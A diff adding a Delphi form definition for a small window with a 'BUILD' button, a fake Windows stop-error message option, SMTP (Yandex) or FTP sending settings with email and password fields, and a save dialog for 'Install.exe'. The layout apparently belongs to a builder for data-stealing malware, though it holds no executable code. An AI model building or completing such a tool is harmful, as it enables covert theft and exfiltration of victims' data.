@@ -1,0 +1,249 @@
+object Form1: TForm1
+  Left = 0
+  Top = 0
+  BorderIcons = [biSystemMenu, biMinimize]
+  BorderStyle = bsSingle
+  ClientHeight = 365
+  ClientWidth = 363
+  Color = clBtnFace
+  Font.Charset = DEFAULT_CHARSET
+  Font.Color = clWindowText
+  Font.Height = -11
+  Font.Name = 'Tahoma'
+  Font.Style = []
+  OldCreateOrder = False
+  Position = poDesktopCenter
+  PixelsPerInch = 96
+  TextHeight = 13
+  object sPanel1: TsPanel
+    Left = 8
+    Top = 8
+    Width = 345
+    Height = 330
+    TabOrder = 0
+    object sSpeedButton17: TsSpeedButton
+      Left = 10
+      Top = 277
+      Width = 325
+      Height = 43
+      Cursor = crHandPoint
+      Caption = 'BUILD'
+      OnClick = sSpeedButton17Click
+    end
+    object sSpeedButton22: TsSpeedButton
+      Left = 10
+      Top = 10
+      Width = 325
+      Height = 34
+      Cursor = crHandPoint
+      Caption = 'INFO SMTP.YANDEX'
+      OnClick = sSpeedButton22Click
+    end
+    object sGroupBox23: TsGroupBox
+      Left = 10
+      Top = 50
+      Width = 325
+      Height = 87
+      Caption = 'MESSAGE'
+      TabOrder = 0
+      CaptionLayout = clTopCenter
+      object sEdit23: TsEdit
+        Left = 65
+        Top = 51
+        Width = 248
+        Height = 22
+        Color = 1643794
+        Enabled = False
+        Font.Charset = RUSSIAN_CHARSET
+        Font.Color = 16380392
+        Font.Height = -11
+        Font.Name = 'Times New Roman'
+        Font.Style = []
+        MaxLength = 50
+        ParentFont = False
+        TabOrder = 0
+        Text = 'STOP: 0X0000007E (0X804E518E)'
+        TextHint = 'message'
+        SkinData.ColorTone = clSilver
+      end
+      object sSlider3: TsSlider
+        Left = 10
+        Top = 50
+        Width = 49
+        Height = 25
+        Cursor = crHandPoint
+        TabOrder = 1
+        OnClick = sSlider3Click
+        FontOn.Charset = DEFAULT_CHARSET
+        FontOn.Color = clWindowText
+        FontOn.Height = -11
+        FontOn.Name = 'Tahoma'
+        FontOn.Style = []
+        Reversed = True
+        SliderOn = False
+        UseSymbols = True
+      end
+      object sRadioButton5: TsRadioButton
+        Left = 10
+        Top = 24
+        Width = 68
+        Height = 17
+        Caption = 'Warning'
+        Checked = True
+        Enabled = False
+        TabOrder = 2
+        TabStop = True
+        ShowFocus = False
+      end
+      object sRadioButton6: TsRadioButton
+        Left = 84
+        Top = 24
+        Width = 52
+        Height = 17
+        Caption = 'Error'
+        Enabled = False
+        TabOrder = 3
+        ShowFocus = False
+      end
+      object sRadioButton7: TsRadioButton
+        Left = 142
+        Top = 24
+        Width = 89
+        Height = 17
+        Caption = 'Confirmation'
+        Enabled = False
+        TabOrder = 4
+        ShowFocus = False
+      end
+      object sRadioButton8: TsRadioButton
+        Left = 237
+        Top = 24
+        Width = 84
+        Height = 17
+        Caption = 'Information'
+        Enabled = False
+        TabOrder = 5
+        ShowFocus = False
+      end
+    end
+    object sGroupBox27: TsGroupBox
+      Left = 10
+      Top = 143
+      Width = 325
+      Height = 128
+      Caption = 'SENDING METHOD'
+      TabOrder = 1
+      CaptionLayout = clTopCenter
+      object sSpeedButton18: TsSpeedButton
+        Left = 6
+        Top = 80
+        Width = 312
+        Height = 33
+        Cursor = crHandPoint
+        Caption = 'TEST SEND YANDEX'
+        OnClick = sSpeedButton18Click
+      end
+      object sLabel44: TsLabel
+        Left = 47
+        Top = 22
+        Width = 99
+        Height = 13
+        Caption = 'smtp.yandex.ru:465'
+      end
+      object sLabel46: TsLabel
+        Left = 219
+        Top = 22
+        Width = 79
+        Height = 13
+        Caption = 'ftp.server.ru:21'
+      end
+      object sEdit38: TsEdit
+        Left = 218
+        Top = 46
+        Width = 101
+        Height = 22
+        TabStop = False
+        Color = 1643794
+        Font.Charset = RUSSIAN_CHARSET
+        Font.Color = 16380392
+        Font.Height = -11
+        Font.Name = 'Times New Roman'
+        Font.Style = []
+        MaxLength = 60
+        ParentFont = False
+        TabOrder = 0
+        TextHint = 'Email'
+        SkinData.ColorTone = clSilver
+      end
+      object sEdit37: TsEdit
+        Left = 113
+        Top = 46
+        Width = 101
+        Height = 22
+        TabStop = False
+        Color = 1643794
+        Font.Charset = RUSSIAN_CHARSET
+        Font.Color = 16380392
+        Font.Height = -11
+        Font.Name = 'Times New Roman'
+        Font.Style = []
+        MaxLength = 60
+        ParentFont = False
+        PasswordChar = '*'
+        TabOrder = 1
+        TextHint = 'Password'
+        SkinData.ColorTone = clSilver
+      end
+      object sEdit35: TsEdit
+        Left = 8
+        Top = 46
+        Width = 101
+        Height = 22
+        TabStop = False
+        Color = 1643794
+        Font.Charset = RUSSIAN_CHARSET
+        Font.Color = 16380392
+        Font.Height = -11
+        Font.Name = 'Times New Roman'
+        Font.Style = []
+        MaxLength = 60
+        ParentFont = False
+        TabOrder = 2
+        TextHint = 'Email'
+        SkinData.ColorTone = clSilver
+      end
+      object sRadioButton13: TsRadioButton
+        Left = 21
+        Top = 19
+        Width = 20
+        Height = 16
+        Checked = True
+        TabOrder = 3
+        TabStop = True
+        OnClick = sRadioButton13Click
+      end
+      object sRadioButton15: TsRadioButton
+        Left = 193
+        Top = 19
+        Width = 20
+        Height = 16
+        TabOrder = 4
+        OnClick = sRadioButton15Click
+      end
+    end
+  end
+  object sStatusBar1: TsStatusBar
+    Left = 0
+    Top = 346
+    Width = 363
+    Height = 19
+    Panels = <>
+    ExplicitTop = 441
+  end
+  object sSaveDialog6: TsSaveDialog
+    FileName = 'Install'
+    Filter = '.exe|*.exe'
+    Left = 302
+    Top = 400
+  end
+end
